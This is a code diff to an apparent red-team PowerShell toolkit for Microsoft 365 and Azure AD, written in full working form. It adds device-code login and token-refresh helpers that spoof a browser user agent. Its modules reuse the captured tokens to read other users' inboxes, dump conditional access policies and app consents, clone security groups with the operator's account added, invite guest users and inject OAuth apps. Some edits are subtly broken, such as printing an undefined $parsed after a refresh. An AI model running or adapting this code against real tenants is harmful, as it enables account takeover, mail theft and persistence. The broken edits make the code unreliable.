@@ -1,3 +1,97 @@
+function Get-GraphTokens{
+    
+    Write-Host -ForegroundColor yellow "[*] Initiating a device code login."
+
+    $body = @{
+        "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+        "resource" =      "https://graph.microsoft.com"
+    }
+    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
+    $Headers=@{}
+    $Headers["User-Agent"] = $UserAgent
+    $authResponse = Invoke-RestMethod `
+        -UseBasicParsing `
+        -Method Post `
+        -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
+        -Headers $Headers `
+        -Body $body
+    Write-Host -ForegroundColor yellow $authResponse.Message
+
+    $continue = "authorization_pending"
+    while($continue)
+            {
+    
+        $body=@{
+            "client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+            "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
+            "code" =       $authResponse.device_code
+            "scope" = "openid"
+        }
+        try{
+        $global:tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body
+        }
+        catch{
+        $details=$_.ErrorDetails.Message | ConvertFrom-Json
+        $continue = $details.error -eq "authorization_pending"
+        Write-Output $details.error
+        }
+        if($tokens)
+            {
+                
+                $tokenPayload = $tokens.access_token.Split(".")[1].Replace('-', '+').Replace('_', '/')
+                while ($tokenPayload.Length % 4) { Write-Verbose "Invalid length for a Base-64 char array or string, adding ="; $tokenPayload += "=" }
+                $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)
+                $tokenArray = [System.Text.Encoding]::ASCII.GetString($tokenByteArray)
+                $tokobj = $tokenArray | ConvertFrom-Json
+                $global:tenantid = $tokobj.tid
+                Write-host "Decoded JWT payload:"
+                $tokobj
+                Write-Host -ForegroundColor Green '[*] Successful authentication. Access and refresh tokens have been written to the global $tokens variable. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $tokens)'
+                break
+            }
+        Start-Sleep -Seconds 3
+    }
+}
+
+function Refresh-GraphTokens{
+    
+    if(!$tokens){
+        write-host -ForegroundColor red '[*] No tokens found in the $tokens variable. Use the Get-GraphTokens module to authenticate first.'
+    break
+    }
+    Write-Host -ForegroundColor yellow "[*] Refreshing Tokens..."
+    $authUrl = "https://login.microsoftonline.com/$tenantid"
+    $refreshbody = @{
+            "resource" = "https://graph.microsoft.com/"
+            "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+            "grant_type" =    "refresh_token"
+            "refresh_token" = $tokens.refresh_token
+            "scope"=         "openid"
+        }
+
+    try{
+    $reftokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "$($authUrl)/oauth2/token" -Headers $Headers -Body $refreshbody
+    }
+    catch{
+    $details=$_.ErrorDetails.Message | ConvertFrom-Json
+    Write-Output $details.error
+    } 
+    if($reftokens)
+            {
+                $global:tokens = $reftokens
+                $tokenPayload = $tokens.access_token.Split(".")[1].Replace('-', '+').Replace('_', '/')
+                while ($tokenPayload.Length % 4) { Write-Verbose "Invalid length for a Base-64 char array or string, adding ="; $tokenPayload += "=" }
+                $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)
+                $tokenArray = [System.Text.Encoding]::ASCII.GetString($tokenByteArray)
+                $tokobj = $tokenArray | ConvertFrom-Json
+                $global:tenantid = $tokobj.tid
+                Write-host "Decoded JWT payload:"
+                $tokobj
+                Write-Host -ForegroundColor Green '[*] Successful authentication. Access and refresh tokens have been written to the global $tokens variable. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $tokens)'
+                break
+            }
+}
+
 function Inject-OAuthApp{
 
 
@@ -60,17 +154,17 @@ function Inject-OAuthApp{
     $Scope,
     
     [Parameter(Position = 3, Mandatory = $False)]
-    [string[]]
-    $AccessToken
+    [object[]]
+    $Tokens
   )
-if($AccessToken){
-    Write-Host -ForegroundColor yellow "[*] Using provided access token."
-    $access_token = $AccessToken
+if($Tokens){
+    Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
+    $access_token = $tokens.access_token
 
 }
 else{
     # Login
-    Write-Host -ForegroundColor yellow "[*] First you need to login as the user you want to deploy the app as."
+    Write-Host -ForegroundColor yellow "[*] First, you need to login as the user you want to deploy the app as."
 
     $body = @{
         "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
@@ -274,7 +368,7 @@ else{
 Write-Host "After you obtain an OAuth Code from the redirect URI server you can use this command to complete the flow:"
 Write-Host "--------------------------------------------------------"
 $scopeclean = ('"' + $scopeurl.replace('%20', ' ').Trim(" ") + '"')
-Write-Host -ForegroundColor Cyan ('Get-AzureAccessToken -ClientId "' + $appresponse.AppId + '" -ClientSecret "' + $Secretdata.secretText + '" -RedirectUri "' + $ReplyURL + '" -scope ' + $scopeclean + " -AuthCode <insert your OAuth Code here>")
+Write-Host -ForegroundColor Cyan ('Get-AzureAppTokens -ClientId "' + $appresponse.AppId + '" -ClientSecret "' + $Secretdata.secretText + '" -RedirectUri "' + $ReplyURL + '" -scope ' + $scopeclean + " -AuthCode <insert your OAuth Code here>")
 }
 }
 
@@ -282,8 +376,8 @@ Write-Host -ForegroundColor Cyan ('Get-AzureAccessToken -ClientId "' + $apprespo
 Function Invoke-GraphOpenInboxFinder{
     param(
     [Parameter(Position = 0, Mandatory = $true)]
-    [string]
-    $access_token = "",
+    [object[]]
+    $Tokens = "",
     [Parameter(Position = 0, Mandatory = $true)]
     [string]
     $userlist = ""
@@ -292,6 +386,8 @@ Function Invoke-GraphOpenInboxFinder{
     $Mailboxes = @(Get-Content -Path $userlist)
     $count = $Mailboxes.count
     $curr_mbx = 0
+
+    $access_token = $tokens.access_token
 
     Write-Output "`n`r"
     Write-Output "[*] Checking access to mailboxes for each email address..."
@@ -314,10 +410,10 @@ Function Invoke-GraphOpenInboxFinder{
     }
 }
 
-## A few tools for working with Azure OAuth2 Authentication Codes and access_tokens
+## A few tools for working with Azure OAuth2 Authentication Codes and access_tokens for Azure App Registrations
 ## By Beau Bullock @dafthack
 
-Function Get-AzureAccessToken{
+Function Get-AzureAppTokens{
 
 Param
 (
@@ -350,27 +446,38 @@ grant_type="authorization_code"
 client_secret=$ClientSecret
 }
 
-$request = Invoke-WebRequest -Method POST -ContentType "application/x-www-form-urlencoded" -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body
-$parsed = $request.Content | ConvertFrom-Json
-Write-Output "---Here is your access token---"
-$parsed.access_token
-Write-Output "---Here is your refresh token---"
-$parsed.refresh_token
+        try{
+        $request = Invoke-WebRequest -Method POST -ContentType "application/x-www-form-urlencoded" -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body
+        }
+        catch{
+        $details=$_.ErrorDetails.Message | ConvertFrom-Json
+        $continue = $details.error -eq "authorization_pending"
+        Write-Output $details.error
+        }
+        if($request)
+            {
+                $global:apptokens = $request.Content | ConvertFrom-Json
+                Write-Output "---Here is your access token---"
+                $apptokens.access_token
+                Write-Output "---Here is your refresh token---"
+                $apptokens.refresh_token
+                Write-Host -ForegroundColor Green '[*] Successful authentication. Access and refresh tokens have been written to the global $apptokens variable. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $apptokens)'
+            }
 }
 
 Function Check-MSGraphAccess{
     param(
     [Parameter(Position = 0, Mandatory = $true)]
-    [string]
-    $access_token = ""
+    [object[]]
+    $Tokens = ""
     )
-
+    $access_token = $tokens.access_token
 $request = Invoke-WebRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/me" -Headers @{"Authorization" = "Bearer $access_token"}
 $out = $request.Content | ConvertFrom-Json
 $out
 }
 
-Function Get-NewAccessTokenWithRefreshToken{
+Function Refresh-AppTokens{
 Param
 (
     [Parameter(Position = 0, Mandatory = $false)]
@@ -403,12 +510,11 @@ client_secret=$ClientSecret
 }
 
 $request = Invoke-WebRequest -Method POST -ContentType "application/x-www-form-urlencoded" -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body
-$parsed = $request.Content | ConvertFrom-Json
+$global:apptokens = $request.Content | ConvertFrom-Json
 Write-Output "---Here is your access token---"
 $parsed.access_token
 Write-Output "---Here is your refresh token---"
 $parsed.refresh_token
-
 
 }
 
@@ -459,19 +565,21 @@ $response.Close()
 
 $listener.Stop()
 
-Get-AzureAccessToken -ClientId $ClientID -ClientSecret $ClientSecret -RedirectUri $RedirectUri -scope $Scope -AuthCode $oauthCode
+Get-AzureAppTokens -ClientId $ClientID -ClientSecret $ClientSecret -RedirectUri $RedirectUri -scope $Scope -AuthCode $oauthCode
 
 }
 
 Function Get-Inbox{
     param(
     [Parameter(Position = 0, Mandatory = $true)]
-    [string]
-    $access_token = "",
+    [object[]]
+    $Tokens = "",
     [Parameter(Position = 0, Mandatory = $true)]
     [string]
     $userid = ""
     )
+
+    $access_token = $Tokens.access_token
 
 $request = Invoke-WebRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/users/$userid/mailFolders/Inbox/messages" -Headers @{"Authorization" = "Bearer $access_token"}
 $out = $request.Content | ConvertFrom-Json
@@ -485,13 +593,13 @@ $out.value
 Function Get-AzureADUsers{
     param(
     [Parameter(Position = 0, Mandatory = $true)]
-    [string]
-    $access_token = "",
+    [object[]]
+    $Tokens = "",
     [Parameter(Position = 1, Mandatory = $true)]
     [string]
     $outfile = ""
     )
-
+    $access_token = $tokens.access_token
 $request = Invoke-WebRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/users" -Headers @{"Authorization" = "Bearer $access_token"}
 $out = $request.Content | ConvertFrom-Json
 
@@ -515,22 +623,28 @@ Function Invoke-DumpCAPS{
         
        Tool for dumping conditional access policies       
     
-    .PARAMETER Domain
+    .PARAMETER Tokens
         
-        Domain for the tenant
-    
+        Token object for auth
     
     .PARAMETER ResolveGuids
         
         Switch to resolve user and group guids if wanted
-    
 
     .EXAMPLE
         
-        C:\PS> Invoke-DumpCAPS -Domain glitchcloud.com -ResolveGuids
+        C:\PS> Invoke-DumpCAPS -ResolveGuids
         Description
         -----------
         This command will dump conditional access policies from the tenant and resolve user and group guids.
+
+
+    .EXAMPLE
+
+        C:\PS> Invoke-DumpCAPS -Tokens $tokens -ResolveGuids
+        Description
+        -----------
+        Use a previously authenticated refresh token to dump CAPS
     
 #>
 
@@ -538,64 +652,100 @@ Function Invoke-DumpCAPS{
     Param(
 
 
-    [Parameter(Position = 0, Mandatory = $True)]
-    [string]
-    $Domain = "",
+    [Parameter(Position = 0, Mandatory = $False)]
+    [switch]
+    $ResolveGuids,
 
     [Parameter(Position = 1, Mandatory = $False)]
-    [switch]
-    $ResolveGuids
+    [object[]]
+    $Tokens = ""
 
   )
 
-    # Login
-    Write-Host -ForegroundColor yellow "[*] First you need to login."
-
-    $body = @{
-        "client_id" =     "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
-        "resource" =      "https://graph.windows.net/"
-    }
-    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
-    $Headers=@{}
-    $Headers["User-Agent"] = $UserAgent
-    $authResponse = Invoke-RestMethod `
-        -UseBasicParsing `
-        -Method Post `
-        -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
-        -Headers $Headers `
-        -Body $body
-    Write-Host -ForegroundColor yellow $authResponse.Message
-
-    $continue = "authorization_pending"
-    while($continue)
-            {
-    
-        $body=@{
-            "client_id" =  "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
-            "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
-            "code" =       $authResponse.device_code
-        }
-        try{
-        $aadtokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body
-        }
-        catch{
-        $details=$_.ErrorDetails.Message | ConvertFrom-Json
-        $continue = $details.error -eq "authorization_pending"
-        Write-Output $details.error
-        }
-        if($aadtokens)
-            {
-                $access_token = $aadtokens.access_token
-                break
+  if($Tokens){
+        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
+        Write-Host -ForegroundColor Yellow "[*] Refreshing token to the Azure AD Graph API..."
+        $RefreshToken = $tokens.refresh_token
+        $authUrl = "https://login.microsoftonline.com/$tenantid"
+        $refreshbody = @{
+                "resource" = "https://graph.windows.net/"
+                "client_id" =     "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
+                "grant_type" =    "refresh_token"
+                "refresh_token" = $RefreshToken
+                "scope"=         "openid"
             }
-        Start-Sleep -Seconds 3
-    }   
- 
+
+    try{
+    $reftokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "$($authUrl)/oauth2/token" -Headers $Headers -Body $refreshbody
+    }
+    catch{
+    $details=$_.ErrorDetails.Message | ConvertFrom-Json
+    Write-Output $details.error
+    }
+    if($reftokens)
+            {
+               $aadtokens = $reftokens
+               $access_token = $aadtokens.access_token
+            }
+  }
+  else{
+        # Login
+        Write-Host -ForegroundColor yellow "[*] Initiating a device code login."
+
+        $body = @{
+            "client_id" =     "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
+            "resource" =      "https://graph.windows.net/"
+        }
+        $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
+        $Headers=@{}
+        $Headers["User-Agent"] = $UserAgent
+        $authResponse = Invoke-RestMethod `
+            -UseBasicParsing `
+            -Method Post `
+            -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
+            -Headers $Headers `
+            -Body $body
+        Write-Host -ForegroundColor yellow $authResponse.Message
+
+        $continue = "authorization_pending"
+        while($continue)
+                {
+    
+            $body=@{
+                "client_id" =  "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
+                "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
+                "code" =       $authResponse.device_code
+            }
+            try{
+            $aadtokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body
+            }
+            catch{
+            $details=$_.ErrorDetails.Message | ConvertFrom-Json
+            $continue = $details.error -eq "authorization_pending"
+            Write-Output $details.error
+            }
+            if($aadtokens)
+                {
+                    $access_token = $aadtokens.access_token
+                    break
+                }
+            Start-Sleep -Seconds 3
+        }   
+    }
+
+    $tokenPayload = $aadtokens.access_token.Split(".")[1].Replace('-', '+').Replace('_', '/')
+    while ($tokenPayload.Length % 4) { Write-Verbose "Invalid length for a Base-64 char array or string, adding ="; $tokenPayload += "=" }
+    $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)
+    $tokenArray = [System.Text.Encoding]::ASCII.GetString($tokenByteArray)
+    $tokobj = $tokenArray | ConvertFrom-Json
+    $tenantid = $tokobj.tid
+
+
     $HeadersAuth = @{
         Authorization = "Bearer $access_token"
     }
 
-    $CAPSUrl = "https://graph.windows.net/$domain/policies?api-version=1.61-internal"
+    $CAPSUrl = "https://graph.windows.net/$tenantid/policies?api-version=1.61-internal"
     $CAPS = Invoke-RestMethod -Method GET -Uri $CAPSUrl -Headers $HeadersAuth
     $parsedjson = $CAPS 
 
@@ -724,7 +874,7 @@ Function Invoke-DumpCAPS{
 
 
 function ResolveGUID($guid,$HeadersAuth) {
-        $url = "https://graph.windows.net/$domain/directoryObjects/$guid/?api-version=1.61-internal"
+        $url = "https://graph.windows.net/$tenantid/directoryObjects/$guid/?api-version=1.61-internal"
         try{
         $resolvedObject = Invoke-RestMethod -Method Get -Uri $url -Headers $HeadersAuth -ErrorAction Stop
         } catch {
@@ -743,15 +893,39 @@ function ResolveGUID($guid,$HeadersAuth) {
 
 
 Function Invoke-DumpApps{
+<#
+    .SYNOPSIS
+        Dump all of the app registrations and external enterprise apps as well as list members that have consented to permissions on their accounts.
+        Author: Beau Bullock (@dafthack)
+        License: MIT
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+        
+       Dump all of the app registrations and external enterprise apps as well as list members that have consented to permissions on their accounts.
+
+    .EXAMPLES      
+        
+        C:\PS> Invoke-DumpApps -Tokens $tokens
+#>
+
 Param(
 
-    [Parameter(Position = 0, Mandatory = $True)]
-    [string]
-    $Domain = ""
+    [Parameter(Position = 0, Mandatory = $False)]
+    [object[]]
+    $Tokens = ""
 
   )
 
-Write-Host -ForegroundColor yellow "[*] First you need to login"
+if($Tokens){
+    Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
+    $accesstoken = $tokens.access_token
+    $refreshtoken = $tokens.refresh_token
+}
+else{
+
+    Write-Host -ForegroundColor yellow "[*] Initiating a device code login"
 
     $body = @{
         "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
@@ -793,7 +967,8 @@ Write-Host -ForegroundColor yellow "[*] First you need to login"
                 break
             }
         Start-Sleep -Seconds 3
-    }    
+    }
+}    
 
    
 Write-Host -ForegroundColor yellow "[*] Getting Microsoft Graph Object ID"
@@ -833,12 +1008,14 @@ Write-Output "Graph ID: $graphId"
 Write-Output "Internal Graph ID: $graphIdInternal"
 
 # Get Object IDs of individual permissions
-Write-Host -ForegroundColor yellow "[*] Now getting object IDs for scope objects:"
+Write-Host -ForegroundColor yellow "[*] Now getting object IDs for scope objects..."
 $spns = Invoke-WebRequest -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$graphIdInternal" -Headers $headers
 $spnsjson = $spns.Content | ConvertFrom-Json
 
 # Construct the Graph API endpoint
 $graphApiUrl = "https://graph.microsoft.com/v1.0"
+
+Write-Host -ForegroundColor yellow "[*] App Registrations:"
 
 # Query app registrations
 $appRegistrations = Invoke-RestMethod -Uri "$graphApiUrl/applications" -Headers @{ Authorization = "Bearer $accessToken" }
@@ -910,7 +1087,7 @@ foreach ($app in $appRegistrations.value) {
         $orginfo = Invoke-RestMethod -Uri "$graphApiUrl/organization" -Headers $headers
         $tenantid = $orginfo.value.id
 
-        $authUrl = "https://login.microsoftonline.com/$domain"
+        $authUrl = "https://login.microsoftonline.com/$tenantid"
         $unsupurl = "https://main.iam.ad.ext.azure.com"
 
         $unsupbody = @{
@@ -977,7 +1154,6 @@ foreach ($app in $appRegistrations.value) {
         
     }
 }
-
 
 
 
@@ -1074,52 +1250,82 @@ function Create-SecurityGroupWithMembers {
 
 function Invoke-SecurityGroupCloner{
 
+<#
+    .SYNOPSIS
+        Clones a security group in Azure Active Directory and allows you to add your own account.
+        Author: Beau Bullock (@dafthack)
+        License: MIT
+        Required Dependencies: None
+        Optional Dependencies: None
 
-# Login
-    Write-Host -ForegroundColor yellow "[*] First you need to login as the user you want to clone a group as."
+    .DESCRIPTION
+        
+       Clones a security group in Azure Active Directory and allows you to add your own account.
 
-    $body = @{
-        "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
-        "resource" =      "https://graph.microsoft.com"
+    .EXAMPLES      
+        
+        C:\PS> Invoke-SecurityGroupCloner -Tokens $tokens
+#>
+
+Param(
+
+    [Parameter(Position = 0, Mandatory = $False)]
+    [object[]]
+    $Tokens = ""
+
+  )
+
+    if($Tokens){
+        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
+        $accesstoken = $tokens.access_token
+        $refreshtoken = $tokens.refresh_token
     }
-    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
-    $Headers=@{}
-    $Headers["User-Agent"] = $UserAgent
-    $authResponse = Invoke-RestMethod `
-        -UseBasicParsing `
-        -Method Post `
-        -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
-        -Headers $Headers `
-        -Body $body
-    Write-Host -ForegroundColor yellow $authResponse.Message
+    else{
 
-    $continue = "authorization_pending"
-    while($continue)
-            {
+        # Login
+        Write-Host -ForegroundColor yellow "[*] First, you need to login as the user you want to clone a group as."
+
+        $body = @{
+            "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+            "resource" =      "https://graph.microsoft.com"
+        }
+        $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
+        $Headers=@{}
+        $Headers["User-Agent"] = $UserAgent
+        $authResponse = Invoke-RestMethod `
+            -UseBasicParsing `
+            -Method Post `
+            -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
+            -Headers $Headers `
+            -Body $body
+        Write-Host -ForegroundColor yellow $authResponse.Message
+
+        $continue = "authorization_pending"
+        while($continue)
+                {
     
-        $body=@{
-            "client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
-            "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
-            "code" =       $authResponse.device_code
-        }
-        try{
-        $global:tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body
-        }
-        catch{
-        $details=$_.ErrorDetails.Message | ConvertFrom-Json
-        $continue = $details.error -eq "authorization_pending"
-        Write-Output $details.error
-        }
-        if($tokens)
-            {
-                write-host -ForegroundColor yellow '[*] Successful Auth! Access and refresh tokens are accessible in the $tokens variable.'
-                $accesstoken = $tokens.access_token
-                break
+            $body=@{
+                "client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+                "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
+                "code" =       $authResponse.device_code
             }
-        Start-Sleep -Seconds 3
-    }    
-
-
+            try{
+            $global:tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body
+            }
+            catch{
+            $details=$_.ErrorDetails.Message | ConvertFrom-Json
+            $continue = $details.error -eq "authorization_pending"
+            Write-Output $details.error
+            }
+            if($tokens)
+                {
+                    write-host -ForegroundColor yellow '[*] Successful Auth! Access and refresh tokens are accessible in the $tokens variable.'
+                    $accesstoken = $tokens.access_token
+                    break
+                }
+            Start-Sleep -Seconds 3
+        }    
+    }
 
 $headers = @{
     Authorization = "Bearer $accessToken"
@@ -1168,9 +1374,24 @@ Create-SecurityGroupWithMembers -AccessToken $accessToken -DisplayName $CloneGro
 
 
 
-
-
 function Invite-GuestUser{
+
+<#
+    .SYNOPSIS
+        Invites a guest user to an Azure Active Directory tenant.
+        Author: Beau Bullock (@dafthack)
+        License: MIT
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+        
+       Invites a guest user to an Azure Active Directory tenant.
+
+    .EXAMPLES      
+        
+        C:\PS> Invite-GuestUser -Tokens $tokens -DisplayName "Lord Voldemort" -EmailAddress "iamlordvoldemort@31337schoolofhackingandwizardry.com"
+#>
 
     Param(
 
@@ -1192,11 +1413,20 @@ function Invite-GuestUser{
 
     [Parameter(Position = 4, Mandatory = $False)]
     [string]
-    $CustomMessageBody = ""
+    $CustomMessageBody = "",
+
+    [Parameter(Position = 5, Mandatory = $False)]
+    [object[]]
+    $Tokens = ""
 
     )
-
-    Write-Host -ForegroundColor yellow "[*] First you need to login"
+    if($Tokens){
+        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
+        $accesstoken = $tokens.access_token
+        $refreshtoken = $tokens.refresh_token
+    }
+    else{
+    Write-Host -ForegroundColor yellow "[*] Initiating a device code login"
 
         $body = @{
             "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
@@ -1238,7 +1468,8 @@ function Invite-GuestUser{
                     break
                 }
             Start-Sleep -Seconds 3
-        }  
+        }
+    }
     $headers = @{"Authorization" = "Bearer $accesstoken"}
     # Construct the Graph API endpoint
     $graphApiUrl = "https://graph.microsoft.com/v1.0"
@@ -1304,12 +1535,63 @@ function Invite-GuestUser{
 
 function Invoke-GraphRecon{
 
+<#
+    .SYNOPSIS
+        PowerShell module to perform general recon via the Azure AD Graph API.
+        Author: Beau Bullock (@dafthack)
+        License: MIT
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+        
+       PowerShell module to perform general recon via the Azure AD Graph API.
+
+    .EXAMPLES      
+        
+        C:\PS> Invoke-GraphRecon -Tokens $tokens
+#>
+
+param(
+    [Parameter(Position = 0, Mandatory = $False)]
+    [object[]]
+    $Tokens = ""
+)
+    if($Tokens){
+        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
+        $accesstoken = $tokens.access_token
+        $refreshtoken = $tokens.refresh_token
+        Write-Host -ForegroundColor Yellow "[*] Refreshing token to the Azure AD Graph API..."
+        $RefreshToken = $tokens.refresh_token
+        $authUrl = "https://login.microsoftonline.com/$tenantid"
+        $refreshbody = @{
+                "resource" = "https://graph.windows.net"
+                "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+                "grant_type" =    "refresh_token"
+                "refresh_token" = $RefreshToken
+                "scope"=         "user_impersonation"
+            }
+
+    try{
+    $reftokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "$($authUrl)/oauth2/token" -Headers $Headers -Body $refreshbody
+    }
+    catch{
+    $details=$_.ErrorDetails.Message | ConvertFrom-Json
+    Write-Output $details.error
+    }
+    if($reftokens)
+            {
+               $aadtokens = $reftokens
+               $access_token = $aadtokens.access_token
+            }
+    }
+    else{
 
     # Login
-    Write-Host -ForegroundColor yellow "[*] First you need to login."
+    Write-Host -ForegroundColor yellow "[*] Initiating a device code login."
 
     $body = @{
-        "client_id" =     "1b730954-1685-4b74-9bfd-dac224a7b894"
+        "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
         "resource" =      "https://graph.windows.net"
     }
     $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
@@ -1328,7 +1610,7 @@ function Invoke-GraphRecon{
             {
     
         $body=@{
-            "client_id" =  "1b730954-1685-4b74-9bfd-dac224a7b894"
+            "client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
             "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
             "code" =       $authResponse.device_code
             "scope" = "user_impersonation"
@@ -1348,6 +1630,7 @@ function Invoke-GraphRecon{
                 break
             }
         Start-Sleep -Seconds 3
+    }
     }
 
 # Generate unique GUIDs
